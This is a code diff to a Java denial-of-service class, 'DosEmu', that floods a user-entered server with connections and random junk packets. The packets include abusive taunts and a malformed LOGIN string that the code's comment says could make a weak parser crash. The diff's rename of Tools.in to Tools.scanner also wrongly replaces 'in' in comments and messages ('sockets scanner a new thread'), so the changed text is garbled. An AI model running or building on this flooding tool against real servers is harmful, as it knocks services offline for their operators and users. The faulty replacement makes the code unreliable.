@@ -42,12 +42,12 @@ public class DosEmu extends Option implements Runnable
         buildSockets.start();
 
         System.out.println("Press 'enter' to quit");
-        Tools.in.nextLine();
+        Tools.scanner.nextLine();
         dos.stop();
     }
     
     /**
-     * Builds sockets in a new thread
+     * Builds sockets scanner a new thread
      */
     public void run()
     {
@@ -73,7 +73,7 @@ public class DosEmu extends Option implements Runnable
                         packets[4] = "Ohayou!";
                         packets[5] = "Ayy lmao!";
                         packets[6] = "It seems you're being fucked :)";
-                        packets[7] = "If you want this to stop just put your mobile up in the air and shout 'ACTIVATEEEEE!'";
+                        packets[7] = "If you want this to stop just put your mobile up scanner the air and shout 'ACTIVATEEEEE!'";
                         packets[8] = "LELELELELELELELELELELELELELELELELELELELELELELELELELELELELELELELELELELELELELELELELELELELELELELELELELELELELELELELEL";
                         packets[9] = ">implying";
                         packets[10] = "LOGIN|asdfasdfasdf|asdfasdf"; //If some servers can't parse packets properly a string instead of an integer might cause the server to explode :)
@@ -86,9 +86,9 @@ public class DosEmu extends Option implements Runnable
                                 connections[i].send(packets[Tools.r.nextInt(10)]);
                                 if(!connections[i].isConnected()) {
                                     System.out.println("WE HAVE NEWS!!!");
-                                    System.out.println("Connection to the server is stopped, this means server might be dead or we're in the blacklist :)");
+                                    System.out.println("Connection to the server is stopped, this means server might be dead or we're scanner the blacklist :)");
                                     System.out.println("Press 'enter' to exit");
-                                    Tools.in.nextLine();
+                                    Tools.scanner.nextLine();
                                     this.stop();
                                 }
                             }
@@ -137,7 +137,7 @@ public class DosEmu extends Option implements Runnable
             }
             System.out.println("Couldn't connect to the server!");
             System.out.print("Re-enter server IP: ");
-            String ip = Tools.in.nextLine();
+            String ip = Tools.scanner.nextLine();
             this.fucker.server = ip;
             connect();
         }
